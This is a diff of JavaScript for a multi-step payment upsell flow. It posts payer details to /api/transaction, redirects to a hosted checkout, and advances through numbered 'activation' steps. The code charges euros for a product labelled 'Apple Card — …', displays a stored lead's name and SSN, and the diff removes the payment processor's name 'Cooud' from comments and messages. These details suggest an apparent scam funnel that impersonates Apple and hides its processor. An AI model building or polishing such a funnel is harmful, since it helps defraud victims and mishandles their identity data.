@@ -9,9 +9,9 @@
  *     next:  '../upp2-ativacao/index.html'  // relative path for skip / success
  *   }
  *
- * Flow: when the user clicks "Pay", we POST to /api/transaction (Cooud-backed)
- * and redirect the browser to the hosted Cooud checkout URL. After payment,
- * Cooud redirects back to `next` (which itself does the same dance) carrying
+ * Flow: when the user clicks "Pay", we POST to /api/transaction and
+ * redirect the browser to the hosted checkout URL. After payment, it
+ * redirects back to `next` (which itself does the same dance) carrying
  * `?pay=ok&cooud_session_id=...`. On arrival we verify with /api/status and,
  * once APPROVED, advance to the next step.
  */
@@ -86,7 +86,7 @@
     }, 700);
   });
 
-  // ─── Minimal verification overlay (shown on return from Cooud) ───
+  // ─── Minimal verification overlay (shown on return from hosted payment) ───
   var VERIFY_OVERLAY = ''
     + '<div class="pay-overlay active" id="verifyOverlay">'
     +   '<div class="pay-modal">'
@@ -109,7 +109,7 @@
 
     var lead = loadLead();
     var customerName = $('customerName');
-    if (customerName) customerName.textContent = lead.nome || '—';
+    if (customerName) customerName.textContent = lead.name || '—';
     var customerIdNumber = $('customerIdNumber');
     if (customerIdNumber) customerIdNumber.textContent = (lead.ssn_masked || lead.ssn || '—');
 
@@ -135,7 +135,7 @@
       goToNext();
     });
 
-    // ─── Return from Cooud: verify session then advance ───
+    // ─── Return from hosted payment: verify session then advance ───
     var params = new URLSearchParams(window.location.search);
     if (params.get('pay') === 'ok' && params.get('cooud_session_id')) {
       var wrap = document.createElement('div');
@@ -161,16 +161,16 @@
 
     var lead = loadLead();
 
-    // After payment, Cooud returns to THIS upsell page so we can verify, then
+    // After payment, the hosted checkout returns to THIS upsell page so we can verify, then
     // forward to cfg.next. successPath/cancelPath are relative to the site root.
     var here = window.location.pathname.replace(/^\//, '');
 
     var payload = {
       amount: amountCents,
       currency: 'eur',
-      payerName: lead.nome || 'Customer',
+      payerName: lead.name || 'Customer',
       email: lead.email || '',
-      phone: lead.telefone || lead.phone || '',
+      phone: lead.phone || '',
       productName: 'Apple Card — ' + cfg.title,
       successPath: here,
       cancelPath: here,
@@ -255,7 +255,7 @@
 
     if (titleEl) titleEl.textContent = 'Could not confirm payment';
     if (descEl) {
-      descEl.innerHTML = 'We did not receive confirmation from Cooud yet. ' +
+      descEl.innerHTML = 'We did not receive payment confirmation yet. ' +
         '<a href="' + window.location.pathname + '" style="color:var(--apple-blue);font-weight:700;text-decoration:none">Try again</a>';
     }
   }
